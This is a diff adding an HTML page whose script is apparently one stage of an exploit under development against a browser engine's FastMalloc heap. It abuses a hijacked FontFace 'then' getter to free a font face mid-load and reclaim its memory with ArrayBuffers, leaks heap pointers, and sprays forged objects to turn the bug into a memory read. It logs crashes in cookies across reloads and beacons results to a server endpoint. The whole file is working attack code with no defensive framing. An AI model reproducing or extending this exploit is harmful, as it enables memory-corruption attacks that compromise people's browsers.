@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P714 — FastMalloc Stable Boundary & Read Forge Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P714 — FastMalloc Stable Boundary & Read Forge Scout
+ *
+ * Mathematical Discovery from P713:
+ * - Surviving offsets are exact power-of-two multiples of 192 bytes:
+ *     0    = 0 * 192 -> SURVIVED
+ *     192  = 1 * 192 -> SURVIVED (2^0)
+ *     768  = 4 * 192 -> SURVIVED (2^2)
+ *     1536 = 8 * 192 -> SURVIVED (2^3)
+ *   Negative and unaligned deltas crashed (into page headers).
+ *
+ * P714 Objectives:
+ * 1. Target the confirmed stable grid: [0, 192, 768, 1536, 3072, 3840].
+ * 2. In each stable target buffer, forge an internal object structure:
+ *      v[0] = P58 (safe self vtable)
+ *      v[1] = 1n  (RefCount = 1)
+ *      v[2] = P68 (target leak address to read)
+ * 3. Point q6 to the forged buffer at that delta.
+ * 4. Execute font loading & Canvas measureText.
+ * 5. Observe if glyph width directly discloses memory bytes at P68!
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P714-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function getCookie(name){
+  var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + name + '=([^;]*)'));
+  return match ? decodeURIComponent(match[1]) : null;
+}
+function setCookie(name, val){
+  document.cookie = name + '=' + encodeURIComponent(val) + '; path=/; max-age=3600';
+}
+function clearCookie(name){
+  document.cookie = name + '=; path=/; max-age=0';
+}
+
+var P58 = null, P68 = null;
+var GRID_DELTAS = [0, 192, 768, 1536, 1920, 3840];
+var GRID_IDX = 0;
+var SPRAY_BUFFERS = [];
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+function run(){
+  b('BOOT','p714-forge-scout');
+  log('=== P714 FastMalloc Stable Boundary & Read Forge ===\n');
+
+  var lastDelta = getCookie('p714_last_delta');
+  var savedIdx = parseInt(getCookie('p714_grid_idx') || '0', 10);
+  if(isNaN(savedIdx) || savedIdx >= GRID_DELTAS.length) savedIdx = 0;
+
+  if(lastDelta !== null){
+    b('FORGE-CRASH', 'delta=' + lastDelta + '|advancingToIdx=' + savedIdx);
+    log('Previous crash on delta ' + lastDelta + '. Advancing to index ' + savedIdx);
+    clearCookie('p714_last_delta');
+  }
+
+  GRID_IDX = savedIdx;
+
+  if(GRID_IDX >= GRID_DELTAS.length){
+    b('ALL-DONE','grid-exhausted');
+    log('All stable grid boundaries tested.');
+    clearCookie('p714_grid_idx');
+    return;
+  }
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Spray forged buffers */
+    log('[Step 2] Spraying forged target buffers...');
+    sprayForgedBuffers();
+
+    /* Step 3: Test current grid boundary */
+    testGridCandidate();
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Spray Forged Target Buffers ---- */
+function sprayForgedBuffers(){
+  SPRAY_BUFFERS = [];
+  for(var i=0; i<64; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    /* Forged structure:
+     * v[0] = P58 (safe self vtable)
+     * v[1] = 1n (RefCount = 1)
+     * v[2] = P68 (target address to disclose)
+     * v[3..23] = indexed identifier
+     */
+    v[0] = P58;
+    v[1] = 1n;
+    v[2] = P68;
+    for(var q=3; q<24; q++){
+      v[q] = BigInt('0xFEEDFACE00000000') | (BigInt(i) << 16n) | BigInt(q);
+    }
+    SPRAY_BUFFERS.push(ab);
+  }
+  log('Sprayed 64 forged buffers targeting P68 disclosure.');
+}
+
+/* ---- Step 3: Test Grid Candidate ---- */
+function testGridCandidate(){
+  if(GRID_IDX >= GRID_DELTAS.length){
+    b('DONE','p714-all-grid-complete');
+    log('\n=== P714 Complete! ===');
+    clearCookie('p714_grid_idx');
+    clearCookie('p714_last_delta');
+    return;
+  }
+
+  var delta = GRID_DELTAS[GRID_IDX];
+  var targetQ6 = P58 + BigInt(delta);
+
+  log('[Testing] Grid Delta +' + delta + ' bytes (Target q6: 0x' + h16(targetQ6) + ')...');
+
+  setCookie('p714_grid_idx', GRID_IDX + 1);
+  setCookie('p714_last_delta', delta);
+
+  b('GRID-PRE-TRY', 'delta=' + delta + '|target_q6=0x' + h16(targetQ6) + '|idx=' + GRID_IDX);
+
+  var stG = document.createElement('style');
+  stG.textContent = '@font-face{font-family:gf' + GRID_IDX + ';src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stG);
+
+  var faceG = new FontFace('fgf' + GRID_IDX, 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(faceG);
+  void faceG.loaded;
+
+  var absG = [], firedG = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedG) return undefined; firedG = true;
+      if(stG){ stG.remove(); stG.textContent = ''; stG = null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<60; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;       /* Anchor q12 = P58 */
+        view[6]  = targetQ6;  /* Point q6 to forged buffer at +delta */
+        absG.push(ab);
+      }
+      try{ document.fonts.check('1em gf' + GRID_IDX); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em fgf' + GRID_IDX + ', gf' + GRID_IDX, 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    clearCookie('p714_last_delta');
+
+    /* Measure text with forged font to test disclosure */
+    var cv = document.createElement('canvas'); cv.width = 150; cv.height = 40;
+    var ctx = cv.getContext('2d');
+    ctx.font = '24px gf' + GRID_IDX + ', Arial';
+    var textWidth = ctx.measureText('Antigravity').width;
+
+    /* Scan sprayed buffers for changes */
+    var modified = [];
+    for(var i=0; i<SPRAY_BUFFERS.length; i++){
+      var v = new BigUint64Array(SPRAY_BUFFERS[i]);
+      if(v[0] !== P58 || v[1] !== 1n || v[2] !== P68){
+        modified.push('buf' + i + '[0]=0x' + h16(v[0]) + ',[1]=0x' + h16(v[1]) + ',[2]=0x' + h16(v[2]));
+      }
+    }
+
+    var resultInfo = 'delta=' + delta + '|w=' + textWidth + '|modified=' + (modified.join(';') || 'none');
+    b('GRID-SURVIVED', resultInfo);
+    log('Grid +' + delta + ' SURVIVED! width=' + textWidth + ' modified=' + (modified.length ? modified.join(';') : 'none'));
+
+    GRID_IDX++;
+    setTimeout(testGridCandidate, 250);
+  }, 400);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P714 — Initializing Grid & Read Forge Scout...</pre></body></html>
